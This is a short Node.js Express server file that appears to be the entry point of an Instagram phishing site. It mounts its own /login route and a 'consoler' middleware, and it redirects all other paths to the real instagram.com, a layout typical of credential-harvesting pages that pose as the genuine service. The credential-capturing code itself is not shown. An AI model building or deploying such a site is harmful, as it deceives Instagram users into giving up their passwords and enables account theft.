const app = require("express")()
const server = require("http").Server(app)
const port = 3000

app.set("view engine", "ejs")
app.use(require("express").urlencoded({extended:true}))

app.use(require("./middleware/headers"))
app.use(require("./middleware/consoler"))

app.use("/login", require("./routes/login"))
app.use("/public", require("./routes/public"))

app.get("/:route", (req,res)=>{
    res.redirect(`https://www.instagram.com/${req.params.route}`)
})

app.get("*", (req,res)=>{
    res.redirect("https://www.instagram.com/login")
})

server.listen(port, ()=>{
    console.log(`Server's listening on port: ${port}`)
})